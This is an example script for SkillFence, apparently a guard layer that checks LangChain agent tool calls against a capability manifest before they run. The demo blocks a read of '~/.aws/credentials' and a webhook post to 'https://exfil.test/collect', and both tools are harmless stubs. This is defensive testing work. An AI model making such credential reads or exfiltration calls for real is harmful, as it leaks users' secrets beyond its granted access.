#!/usr/bin/env python3
"""Worked example: SkillFence in front of real LangChain tools.

Run: pip install 'skillfence[langchain]' && python3 examples/langchain-adapter/demo.py

Unlike the MCP proxy (a separate process sitting on the wire), this
adapter is a `BaseCallbackHandler` you construct in your own Python agent
code and pass to `tool.run(callbacks=[handler])` or
`AgentExecutor(..., callbacks=[handler])` — LangChain tools are called as
regular Python functions inside your process, not over a protocol, so
there's no proxy process to stand in front of them.
"""

from __future__ import annotations

from pathlib import Path

from langchain_core.tools import tool

from skillfence.adapters.langchain_adapter import build_handler
from skillfence.events.bus import EventBus
from skillfence.hitl.cli_gate import HumanGate
from skillfence.hitl.decisions import DecisionType
from skillfence.mcp.toolmap import ToolMap
from skillfence.policy.manifest import CapabilityManifest
from skillfence.runtime.gateway import ActionBlocked, RuntimeGateway
from skillfence.runtime.sandbox import Sandbox

HERE = Path(__file__).parent


# -- two real LangChain tools, exactly as you'd define them in a real agent --

@tool
def read_file(path: str) -> str:
    """Read a local file's contents."""
    return f"(demo) contents of {path}"


@tool
def send_webhook(url: str) -> str:
    """POST a status update to a webhook URL."""
    return f"(demo) would have POSTed to {url}"


def main() -> None:
    manifest = CapabilityManifest.load(HERE / "manifest.yaml")
    tool_map = ToolMap.load(HERE / "tool-map.yaml")

    bus = EventBus(HERE / ".runs" / "demo.events.jsonl")
    # --decision reject, non-interactive, so this demo runs unattended —
    # see the top-level README for what a live human decision looks like.
    human_gate = HumanGate(auto_decider=lambda _req: DecisionType.REJECT)
    sandbox = Sandbox(root=HERE / "sandbox")
    gateway = RuntimeGateway(
        bus=bus, manifest=manifest, sandbox=sandbox, human_gate=human_gate,
        session_id="langchain-demo", agent="langchain-demo", skill=manifest.name,
    )
    gateway.start()
    handler = build_handler(gateway, tool_map)

    print(f"Skill: {manifest.name}  (declares filesystem.read: {manifest.capabilities.filesystem.read})\n")

    print("1) Declared read — allowed, real function runs:")
    print("   ->", read_file.run({"path": "./reports/q3.md"}, callbacks=[handler]))

    print("\n2) Undeclared, sensitive read — SkillFence blocks it before the real function runs:")
    try:
        read_file.run({"path": "~/.aws/credentials"}, callbacks=[handler])
    except ActionBlocked as exc:
        print("   -> BLOCKED:", exc.finding.title)

    print("\n3) Network tool with network.enabled: false in the manifest — also blocked:")
    try:
        send_webhook.run({"url": "https://exfil.test/collect"}, callbacks=[handler])
    except ActionBlocked as exc:
        print("   -> BLOCKED:", exc.finding.title)

    print(f"\n{len(gateway.findings)} finding(s) recorded. Full evidence: {bus.jsonl_path}")


if __name__ == "__main__":
    main()
